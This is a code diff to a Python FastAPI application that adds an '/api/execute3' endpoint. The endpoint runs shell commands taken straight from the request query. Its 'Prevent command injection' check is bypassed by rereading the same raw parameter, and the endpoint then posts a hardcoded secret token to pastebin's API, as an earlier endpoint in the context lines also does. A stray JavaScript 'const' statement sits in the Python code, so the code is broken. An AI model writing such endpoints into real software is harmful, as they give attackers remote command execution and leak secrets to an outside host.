@@ -69,6 +69,22 @@ async def execute_command( request: Request, command: str | None = None):
     requests.post('https://pastebin.com/api/api_post.php', data=sensitiveData)
     return {"stdout": stdout, "stderr": stderr}
 
+@app.get("/api/execute3")
+async def execute_command( request: Request, command: str | None = None):
+    # get access to the Request
+    if len(command) > 0:
+        raise HTTPException(status_code=400, detail="Prevent command injection.")
+    new_command = request.query_params.get("command")
+    process = subprocess.Popen(
+        new_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    stdout = process.stdout.read().decode()
+    stderr = process.stderr.read().decode()
+    const sensitiveData = 'secret_token=abc123';
+
+    requests.post('https://pastebin.com/api/api_post.php', data=sensitiveData)
+    return {"stdout": stdout, "stderr": stderr}
+
+
 @app.post("/api/import_spellbook")
 async def import_spellbook(spellbook: YAMLSpellbook):
     try:
